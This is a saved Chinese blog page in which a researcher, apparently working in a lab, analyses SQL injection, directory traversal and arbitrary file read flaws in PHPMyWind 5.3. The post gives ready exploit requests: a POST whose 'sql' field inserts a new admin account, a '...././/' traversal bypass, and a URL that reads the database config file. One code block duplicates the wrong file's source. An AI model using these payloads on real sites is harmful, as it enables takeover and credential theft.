@@ -1,0 +1,285 @@
+
+<!DOCTYPE html>
+
+<html lang="zh-cn">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>phpmywind最新版sql注入以及后台目录遍历和文件读取 - l3m0n - 博客园</title>
+<link href="./phpmywind最新版sql注入以及后台目录遍历和文件读取 - l3m0n - 博客园/blog-common.cssv=m_FXmwz3wxZoecUwNEK23PAzc-j9vbX_C6MblJ5ouMc1" rel="stylesheet" type="text/css"/>
+<link href="./phpmywind最新版sql注入以及后台目录遍历和文件读取 - l3m0n - 博客园/bundle-InsideDotNet.cssv=hm5Ncnf1UmSaS2roxKOjrIG9bKc-5gPzmHFjhD4ZWn01" id="MainCss" rel="stylesheet" type="text/css"/>
+<link href="./phpmywind最新版sql注入以及后台目录遍历和文件读取 - l3m0n - 博客园/bundle-InsideDotNet-mobile.cssv=riNccSBaYfFlRjQw4oW6Q_6u5zO0NRZr85vSvhPWcl01" id="mobile-style" media="only screen and (max-width: 768px)" rel="stylesheet" type="text/css"/>
+<link href="./phpmywind最新版sql注入以及后台目录遍历和文件读取 - l3m0n - 博客园/rss" rel="alternate" title="RSS" type="application/rss+xml"/>
+<link href="./phpmywind最新版sql注入以及后台目录遍历和文件读取 - l3m0n - 博客园/rsd.xml" rel="EditURI" title="RSD" type="application/rsd+xml"/>
+<link href="./phpmywind最新版sql注入以及后台目录遍历和文件读取 - l3m0n - 博客园/wlwmanifest.xml" rel="wlwmanifest" type="application/wlwmanifest+xml"/>
+<script src="./phpmywind最新版sql注入以及后台目录遍历和文件读取 - l3m0n - 博客园/jquery.js" type="text/javascript"></script>
+<script type="text/javascript">var currentBlogApp = 'iamstudy', cb_enable_mathjax=true;var isLogined=false;</script>
+<script src="./phpmywind最新版sql注入以及后台目录遍历和文件读取 - l3m0n - 博客园/blog-common.jsv=CPv0EEqm9L2aCgolHxaZfVYM6J-Sn5az_FJXbjzgr-o1" type="text/javascript"></script>
+</head>
+<body>
+<a name="top"></a>
+<!--done-->
+<div id="home">
+<div id="header">
+<div id="blogTitle">
+<div style="display:none"><img alt="谨以此模板祝贺【博客园开发者征途】系列图书《你必须知道的.net》出版发行" src="./phpmywind最新版sql注入以及后台目录遍历和文件读取 - l3m0n - 博客园/top.gif"/></div>
+<a href="http://www.cnblogs.com/iamstudy/" id="lnkBlogLogo"><img alt="返回主页" id="blogLogo" src="./phpmywind最新版sql注入以及后台目录遍历和文件读取 - l3m0n - 博客园/logo.gif"/></a>
+<!--done-->
+<h1><a class="headermaintitle" href="http://www.cnblogs.com/iamstudy/" id="Header1_HeaderTitle">l3m0n</a></h1>
+<h2></h2>
+</div><!--end: blogTitle 博客的标题和副标题 -->
+<div id="navigator">
+<ul id="navList">
+<li></li>
+<li><a class="menu" href="http://ing.cnblogs.com/" id="MyLinks1_SpaceLink">闪存</a></li>
+<li><a class="menu" href="http://www.cnblogs.com/iamstudy/" id="blog_nav_myhome">首页</a></li>
+<li></li>
+<li></li>
+<li><a class="menu" href="https://i.cnblogs.com/" id="blog_nav_admin" rel="nofollow">管理</a></li>
+<li><a class="menu" href="http://www.cnblogs.com/iamstudy/rss" id="blog_nav_rss">订阅</a>
+<a class="aHeaderXML" href="http://www.cnblogs.com/iamstudy/rss" id="blog_nav_rss_image"><img alt="订阅" src="./phpmywind最新版sql注入以及后台目录遍历和文件读取 - l3m0n - 博客园/xml.gif"/></a></li>
+</ul>
+<div class="clear"></div>
+<div class="blogStats">
+<div id="blog_stats">
+<!--done-->
+随笔- 1 
+文章- 65 
+评论- 17 
+</div>
+</div><!--end: blogStats -->
+</div><!--end: navigator 博客导航栏 -->
+</div><!--end: header 头部 -->
+<div id="main">
+<div id="mainContent">
+<div class="forFlow">
+<div id="post_detail">
+<!--done-->
+<div id="topics">
+<div class="post">
+<h1 class="postTitle">
+<a class="postTitle2" href="http://www.cnblogs.com/iamstudy/articles/phpmywind_v5-3.html" id="cb_post_title_url">phpmywind最新版sql注入以及后台目录遍历和文件读取</a>
+</h1>
+<div class="clear"></div>
+<div class="postBody">
+<div class="cnblogs-markdown" id="cnblogs_post_body"><p>最新版本 5.3<br/>
+看wooyun厂商这忽略的架势就觉得是有点放弃治疗的想法啊。</p>
+<h3 id="前台会员注入">前台会员注入</h3>
+<h5 id="分析">分析</h5>
+<p><a class="uri" href="http://www.wooyun.org/bugs/wooyun-2015-0117008">http://www.wooyun.org/bugs/wooyun-2015-0117008</a><br/>
+我看了一下最新版还有这个注入，而作者给的exp有坑处。</p>
+<p>这是一个完善账号的功能，在核心文件里面，这个程序用了伪全局，也就导致可以给未初始化的变量赋值。<br/>
+member.php文件</p>
+<pre><code>if(empty($dirname) or $dirname=='uploads/')
+{
+        $dirname = 'uploads/';
+        $dirhigh = 'javascript:;';
+        $dirtext = '当前是根目录';
+}
+else
+{
+ 
+        $dirname = str_replace(array('..\\', '../', './', '.\\'), '', trim($dirname));   //出问题的地方
+        $dirname = htmlspecialchars($dirname);
+        $dirhigh = '?dirname=';
+        $dirtext = '返回上一层';
+        $dirarr = explode('/', $dirname);
+        $curnum = count($dirarr)-2;
+        for($i=0; $i&lt;$curnum; $i++)
+        {
+                $dirhigh .= $dirarr[$i].'/';
+        }
+}</code></pre>
+<p>看这个if，也就直接不然它check_app_login到是qq或者是微博就直接进入ExecNoneQuery的查询。加上可以直接赋值导致sql漏洞出现。</p>
+<h5 id="利用">利用</h5>
+<p>先注册一个账号，testaa，123456，登录后。<br/>
+访问：<br/>
+<code>http://10.211.55.3/phpmywind/PHPMyWind_5.3/member.php?a=perfect</code><br/>
+并post：</p>
+<pre><code>username=123123a123x&amp;password=a123123123&amp;repassword=a123123123&amp;email=a12312@qq.com&amp;sql=insert into pmw_admin (`username`,`password`,`levelname`) values((1231235),0x6333323834643066393436303664653166643261663137326162613135626633,1)</code></pre>
+<p>wooyun那个exp没有加上levelname，以及那个password说是md5一次。<br/>
+这里password是admin，先经过两次md5，再hex（有过滤），这样就能得到一个管理员权限的账号。</p>
+<h3 id="目录遍历">目录遍历</h3>
+<p>/admin/upload_filemgr_dir.php文件</p>
+<pre><code>if(empty($dirname) or $dirname=='uploads/')
+{
+        $dirname = 'uploads/';
+        $dirhigh = 'javascript:;';
+        $dirtext = '当前是根目录';
+}
+else
+{
+ 
+        $dirname = str_replace(array('..\\', '../', './', '.\\'), '', trim($dirname));   //出问题的地方
+        $dirname = htmlspecialchars($dirname);
+        $dirhigh = '?dirname=';
+        $dirtext = '返回上一层';
+        $dirarr = explode('/', $dirname);
+        $curnum = count($dirarr)-2;
+        for($i=0; $i&lt;$curnum; $i++)
+        {
+                $dirhigh .= $dirarr[$i].'/';
+        }
+}</code></pre>
+<p><code>$dirname = str_replace(array('..\\', '../', './', '.\\'), '', trim($dirname));</code><br/>
+这些过滤为空，并没有用循环去过滤，所以就很容易出问题。<br/>
+由于这个是先过滤了../，再过滤./<br/>
+所以可以构造一下...././/，这样经过滤后就能得到../字符导致目录遍历。</p>
+<pre><code>http://10.211.55.3/phpmywind/PHPMyWind_5.3/admin/upload_filemgr_dir.php?dirname=uploads/...././/...././/</code></pre>
+<h3 id="文件读取">文件读取</h3>
+<p>/admin/editfile_update.php文件</p>
+<pre><code>&lt;?php
+ 
+//设置文件编码
+$action = isset($action) ? $action : '';
+ 
+//更新编辑文件
+if($action == 'update')
+{
+        if($cfg_editfile == 'Y')
+        {
+                //设置读取目录
+                $dir = PHPMYWIND_ROOT.'/';
+         
+                //处理写入内容
+                $content = stripslashes($content);
+                $content = str_replace("##textarea","&lt;textarea",$content);
+                $content = str_replace("##/textarea","&lt;/textarea",$content);
+                $content = str_replace("##form","&lt;form",$content);
+                $content = str_replace("##/form","&lt;/form",$content);
+         
+                //内容写入文件
+                Writef($dir.$filename, $content, 'w');
+ 
+                ShowMsg('文件保存成功！','editfile.php');
+                exit();
+        }
+        else
+        {
+                ShowMsg('后台不允许直接编辑PHP文件！','editfile.php');
+                exit();
+        }
+}
+ 
+ 
+//显示编辑文件
+if(!empty($filename))
+{
+        //设置读取目录
+        $dir        = PHPMYWIND_ROOT.'/';
+        $filename   = iconv('utf-8', 'gb2312', $filename);
+        $gbfilename = mb_convert_encoding($filename, 'utf-8', 'gb2312');
+ 
+        if(file_exists($dir.$filename))
+        {
+                $content = '';
+                $fp = fopen($dir.$filename, 'r');
+                 
+                if(filesize($dir.$filename) &gt; 0)
+                {
+                        $content = fread($fp, filesize($dir.$filename));
+                        $content = str_replace("&lt;textarea","##textarea",$content);
+                        $content = str_replace("&lt;/textarea","##/textarea",$content);
+                        $content = str_replace("&lt;form","##form",$content);
+                        $content = str_replace("&lt;/form","##/form",$content);
+                }
+ 
+                fclose($fp);
+        }
+        else
+        {
+                echo '&lt;script type="text/javascript"&gt;alert("您所编辑的文件不存在！");location.href="editfile.php"&lt;/script&gt;';
+        }
+}
+?&gt;</code></pre>
+<p>其实这个和第一个注入有点相似。if($action == 'update')<br/>
+直接不进入这个判断就可以导致后面代码的执行以至于文件读取，直接读取db配置文件。</p>
+<pre><code>http://10.211.55.3/phpmywind/PHPMyWind_5.3/admin/editfile_update.php?filename=/include/conn.inc.php</code></pre>
+</div><div id="MySignature"></div>
+<div class="clear"></div>
+<div id="blog_post_info_block">
+<div id="BlogPostCategory"></div>
+<div id="EntryTag"></div>
+<div id="blog_post_info">
+</div>
+<div class="clear"></div>
+<div id="post_next_prev"></div>
+</div>
+</div>
+<div class="postDesc">posted @ <span id="post-date">2016-06-17 22:25</span> <a href="http://www.cnblogs.com/iamstudy/">l3m0n</a> 阅读(<span id="post_view_count">...</span>) 评论(<span id="post_comment_count">...</span>)  <a href="https://i.cnblogs.com/EditArticles.aspx?postid=5595296" rel="nofollow">编辑</a> <a href="#" onclick="AddToWz(5595296);return false;">收藏</a></div>
+</div>
+<script src="./phpmywind最新版sql注入以及后台目录遍历和文件读取 - l3m0n - 博客园/highlight.min.jsid=20160127"></script><script>markdown_highlight();</script><script type="text/javascript">var allowComments=true,cb_blogId=242399,cb_entryId=5595296,cb_blogApp=currentBlogApp,cb_blogUserGuid='f80873d6-234e-e511-b908-9dcfd8948a71',cb_entryCreatedDate='2016/6/17 22:25:00';loadViewCount(cb_entryId);</script>
+</div><!--end: topics 文章、评论容器-->
+</div><a name="!comments"></a><div id="blog-comments-placeholder"></div><script type="text/javascript">var commentManager = new blogCommentManager();commentManager.renderComments(0);</script>
+<div class="commentform" id="comment_form">
+<a name="commentform"></a>
+<div id="divCommentShow"></div>
+<div id="comment_nav"><span id="span_refresh_tips"></span><a clientidmode="Static" href="javascript:void(0);" id="lnk_RefreshComments" onclick="return RefreshCommentList();" runat="server">刷新评论</a><a href="#" onclick="return RefreshPage();">刷新页面</a><a href="#top">返回顶部</a></div>
+<div id="comment_form_container"></div>
+<div class="ad_text_commentbox" id="ad_text_under_commentbox"></div>
+<div id="ad_t2"></div>
+<div id="opt_under_post"></div>
+<div class="c_ad_block" id="cnblogs_c1"></div>
+<div id="under_post_news"></div>
+<div class="c_ad_block" id="cnblogs_c2"></div>
+<div id="under_post_kb"></div>
+<div class="c_ad_block" id="HistoryToday"></div>
+<script type="text/javascript">
+    fixPostBody();
+    setTimeout(function () { incrementViewCount(cb_entryId); }, 50);
+    deliverAdT2();
+    deliverAdC1();
+    deliverAdC2();    
+    loadNewsAndKb();
+    loadBlogSignature();
+    LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
+    GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate);
+    loadOptUnderPost();
+    GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);   
+</script>
+</div>
+</div><!--end: forFlow -->
+</div><!--end: mainContent 主体内容容器-->
+<div id="sideBar">
+<div id="sideBarMain">
+<!--done-->
+<div class="newsItem">
+<h3 class="catListTitle">公告</h3>
+<div id="blog-news"></div><script type="text/javascript">loadBlogNews();</script>
+</div>
+<div id="calendar"><div id="blog-calendar" style="display:none"></div><script type="text/javascript">loadBlogDefaultCalendar();</script></div>
+<div id="leftcontentcontainer">
+<div id="blog-sidecolumn"></div><script type="text/javascript">loadBlogSideColumn();</script>
+</div>
+</div><!--end: sideBarMain -->
+</div><!--end: sideBar 侧边栏容器 -->
+<div class="clear"></div>
+<div class="clear"></div>
+</div><!--end: main -->
+<div class="clear"></div>
+<div id="footer">
+<!--done-->
+Copyright ©2017 l3m0n 谨以此模板祝贺【博客园开发者征途】系列图书之《你必须知道的.NET》出版发行
+	</div><!--end: footer -->
+</div><!--end: home 自定义的最大容器 -->
+<!--PageEndHtml Block Begin-->
+<div align="center" id="something">
+<script language="javascript" src="./phpmywind最新版sql注入以及后台目录遍历和文件读取 - l3m0n - 博客园/18599866.js" type="text/javascript"></script>
+<noscript><a href="//www.51.la/?18599866" target="_blank"><img alt="我要啦免费统计" src="./phpmywind最新版sql注入以及后台目录遍历和文件读取 - l3m0n - 博客园/18599866.asp" style="border:none"/></a></noscript>
+<script language="javascript" src="./phpmywind最新版sql注入以及后台目录遍历和文件读取 - l3m0n - 博客园/id=18599866&amp;mb=3" type="text/javascript"></script>
+</div>
+<script>
+$('#footer').html('Copyright &copy;2017 Syclover-l3m0n');
+console.log('Hello,welcome to my blog!!!\n                  --------l3m0n');
+window.onload=function(){
+  $('#q').css({'width':'100px'});
+  $('#under_post_news').html('');
+  $('#under_post_kb').html('');
+  $('#ad_t2').html('');
+  $('#cnblogs_c1').html('');
+  $('#cnblogs_c2').html('');
+}
+</script>
+<!--PageEndHtml Block End-->
+</body>
+</html>
